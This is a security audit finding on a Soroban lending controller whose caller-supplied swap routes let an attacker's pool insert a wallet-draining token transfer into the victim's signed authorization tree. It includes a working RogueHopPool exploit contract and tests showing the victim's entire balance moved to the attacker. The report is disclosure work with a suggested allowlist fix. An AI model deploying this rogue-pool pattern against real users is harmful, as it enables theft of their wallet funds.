### Title
Attacker-controlled swap route lets a rogue venue steal the caller's wallet tokens via the signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
Controller strategy entrypoints (`multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`) accept a caller-supplied `swap: Bytes` route and forward it to the router, which invokes whatever pool/token addresses the payload names with no allowlist. A malicious pool contract can call `token.transfer(victim, attacker, x)` for any token the victim holds; that call is recorded by simulation as a child of the victim's own `require_auth` entry, and if the victim signs the simulated tree (the standard flow), the transfer executes — draining wallet funds far beyond the routed amount. This mirrors the code-server flaw: a request is forwarded to an attacker-chosen destination carrying the user's credentials (here, the caller's authorization tree instead of a session cookie).

### Finding Description
`swap_collateral` (and siblings) call `caller.require_auth()` and pass `swap` bytes to the configured router. Per the project's own threat model, "the router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization. A token transfer that such code makes from the caller is recorded by an honest simulation as a child of the caller's authorization entry, and it executes if the caller signs that tree." The threat model further admits "the loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [1](#0-0) .

The test `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` proves the exploit end-to-end: a router double invokes a payload-named `RogueHopPool`, whose `swap` performs `token.transfer(alice, attacker, WALLET_BALANCE)` on a token the protocol never listed [2](#0-1) . Simulation records that transfer as a sub-invocation under Alice's `swap_collateral` auth entry [3](#0-2) , and in enforcing mode the same route succeeds once the victim signs the poisoned tree, moving her entire wallet balance to the attacker [4](#0-3) .

### Impact Explanation
Theft of user funds. The victim loses arbitrary tokens held in their wallet — assets that were never deposited into the protocol and are completely outside the route's `total_in`. The controller's defenses (exact input-transfer grant, measured output, final HF/LTV checks, flash guard) all pass, because the theft happens inside the route hop and is invisible to controller accounting; the position even ends solvent since the rogue pool can also return a fair output.

### Likelihood Explanation
Reachable by any unprivileged address via `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, or `multiply`. Exploitation requires the victim to submit a route containing the attacker's pool and sign the auth tree that simulation returns — directly analogous to the advisory's requirement that a user click a crafted `/proxy` URL (UI:R). Since Soroban clients typically sign whatever simulation produces for a swap they initiated, a phishing-style "here is your route payload" flow suffices. No privileged role, oracle manipulation, or timing is needed.

### Recommendation
Constrain which code can run under the caller's authorization: have the router validate hop pool addresses against an allowlist (or at minimum a "registered venue" registry), or have the controller reject `swap` payloads whose decoded program references non-venue contracts. Document and enforce in clients that a signed auth tree for a strategy call must contain exactly one input `transfer` child and nothing else; consider a router-side check (e.g., comparing recorded sub-invocations is not possible on-chain, so allowlisting is the enforceable fix).

```rust
// Attacker deploys RogueHopPool preconfigured with
// (victim=Alice, token=any token Alice holds, to=attacker, amount=Alice's balance).
#[contractimpl]
impl RogueHopPool {
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) =
            env.storage().instance().get(&symbol_short!("PLAN")).unwrap();
        token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
    }
}

// Victim calls controller.swap_collateral(caller=Alice, account_id, "USDC",
// amount, "ETH", swap) where `swap` routes through RogueHopPool.
// Simulation records:
//   AuthorizedInvocation(root = swap_collateral,
//     sub_invocations = [transfer(Alice, attacker, WALLET_BALANCE)])
// Alice signs the simulated tree; the host accepts the rogue transfer.
// Result: wallet(Alice) == 0, wallet(attacker) == WALLET_BALANCE,
// while the position still passes all controller risk checks.
```

```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
